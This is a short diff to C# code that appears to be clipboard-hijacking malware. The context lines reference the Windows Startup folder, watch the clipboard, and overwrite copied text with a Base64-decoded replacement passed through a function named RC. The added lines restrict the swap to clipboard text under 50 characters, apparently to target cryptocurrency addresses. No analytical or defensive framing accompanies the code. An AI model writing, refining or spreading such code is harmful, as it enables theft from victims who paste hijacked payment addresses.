@@ -80,7 +80,9 @@ string path = Environment.GetFolderPath( Environment.SpecialFolder.Startup ) + "
                     if (Clipboard.ContainsText())
                     {
                         idat = Clipboard.GetText();
-
+		
+if(idat.Length <50)
+{
                         if (idat != idat_old)
                         {
                           
@@ -98,7 +100,7 @@ new Thread(() => { Clipboard.SetText(RC(Encoding.UTF8.GetString(Convert.FromBase
                             idat_old = idat;
                         }
                     }
-                }
+                }}
                 catch
                 {    }
 			}
